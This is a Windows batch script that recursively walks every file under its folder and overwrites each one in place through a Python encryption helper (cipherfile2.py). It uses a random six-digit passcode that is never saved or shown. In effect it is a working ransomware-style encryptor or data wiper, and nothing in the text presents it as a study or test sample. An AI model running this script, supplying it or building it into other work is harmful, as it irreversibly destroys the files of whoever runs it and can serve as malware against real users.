@echo off
setlocal enabledelayedexpansion
set "SCRIPT=%~dp0cipherfile2.py"
set "SCRIPT_FULL=%~f0"
set "PYTHON_FULL=%SCRIPT%"
for /R %%F in (*) do (
    set "CURRENT_FULL=%%~fF"
    if /I not "!CURRENT_FULL!"=="!SCRIPT_FULL!" if /I not "!CURRENT_FULL!"=="!PYTHON_FULL!" (
        set /a passcode=(%RANDOM% * 32768 + %RANDOM%) %% 1000000
        set passcode=000000!passcode!
        set passcode=!passcode:~-6!
        python "%SCRIPT%" "%%F" "%%F" "!passcode!"
    )
)
